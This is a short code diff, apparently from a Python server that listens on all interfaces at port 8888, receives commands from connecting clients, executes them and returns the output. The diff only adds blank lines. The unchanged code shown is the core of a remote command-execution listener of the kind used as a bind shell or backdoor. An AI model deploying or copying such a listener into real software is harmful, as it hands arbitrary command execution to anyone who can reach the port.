@@ -14,8 +14,10 @@ def execute_command(command):
 def handle_client(conn, addr):
     while True:
         command = conn.recv(1024).decode()
+        
         if not command:
             break
+            
         output = execute_command(decode_command(command))
         conn.send(output.encode())
 
@@ -31,9 +33,11 @@ def accept_connections(sock):
 
 def main():
     sock = create_socket('0.0.0.0', 8888)
+    
     while True:
         try:
             accept_connections(sock)
+            
         except ConnectionResetError:
             print("Client left.")
             continue
